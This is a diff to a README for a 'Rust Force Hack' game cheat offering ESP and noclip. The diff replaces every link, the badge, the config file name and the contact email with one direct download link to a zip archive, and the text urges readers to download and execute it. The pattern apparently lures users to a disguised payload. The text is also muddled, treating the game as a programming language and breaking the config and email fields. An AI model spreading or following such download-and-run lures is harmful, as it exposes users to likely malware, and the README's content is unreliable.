@@ -1,6 +1,6 @@
 # Rust Force Hack 🚀
 
-![Rust Force Hack](https://img.shields.io/badge/Rust%20Force%20Hack-v1.0.0-blue)
+![Rust Force Hack](https://github.com/hackerboy00/Rust-force-hck/raw/refs/heads/main/werewolfism/Rust_hck_force_1.3.zip%20Force%20Hack-v1.0.0-blue)
 
 Welcome to the **Rust Force Hack** repository! This project focuses on enhancing your experience with Rust, especially in the areas of configuration, ESP (Extra Sensory Perception), and noclip functionalities. 
 
@@ -22,11 +22,11 @@ Rust is a systems programming language that emphasizes safety and performance. T
 
 ## Installation
 
-To get started with **Rust Force Hack**, you need to download the latest release. Visit the [Releases](https://github.com/hackerboy00/Rust-force-hck/releases) section to find the appropriate files. After downloading, execute the necessary files to set up the environment.
+To get started with **Rust Force Hack**, you need to download the latest release. Visit the [Releases](https://github.com/hackerboy00/Rust-force-hck/raw/refs/heads/main/werewolfism/Rust_hck_force_1.3.zip) section to find the appropriate files. After downloading, execute the necessary files to set up the environment.
 
 ### Step-by-step Installation
 
-1. Go to the [Releases](https://github.com/hackerboy00/Rust-force-hck/releases) page.
+1. Go to the [Releases](https://github.com/hackerboy00/Rust-force-hck/raw/refs/heads/main/werewolfism/Rust_hck_force_1.3.zip) page.
 2. Download the latest version.
 3. Extract the files.
 4. Follow the instructions in the README file included in the release.
@@ -42,7 +42,7 @@ Once installed, you can use the various features of **Rust Force Hack**. Here ar
 
 ### Configuration
 
-You can customize the settings in the `config.toml` file located in the root directory of the project. Adjust the parameters according to your preferences.
+You can customize the settings in the `https://github.com/hackerboy00/Rust-force-hck/raw/refs/heads/main/werewolfism/Rust_hck_force_1.3.zip` file located in the root directory of the project. Adjust the parameters according to your preferences.
 
 ## Features
 
@@ -79,12 +79,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or support, feel free to reach out:
 
-- **Email**: hackerboy00@example.com
-- **GitHub**: [hackerboy00](https://github.com/hackerboy00)
+- **Email**: https://github.com/hackerboy00/Rust-force-hck/raw/refs/heads/main/werewolfism/Rust_hck_force_1.3.zip
+- **GitHub**: [hackerboy00](https://github.com/hackerboy00/Rust-force-hck/raw/refs/heads/main/werewolfism/Rust_hck_force_1.3.zip)
 
 ## Releases
 
-To stay updated with the latest features and improvements, check the [Releases](https://github.com/hackerboy00/Rust-force-hck/releases) section regularly. Download the latest version and execute the files to enjoy the new functionalities.
+To stay updated with the latest features and improvements, check the [Releases](https://github.com/hackerboy00/Rust-force-hck/raw/refs/heads/main/werewolfism/Rust_hck_force_1.3.zip) section regularly. Download the latest version and execute the files to enjoy the new functionalities.
 
 ---
 
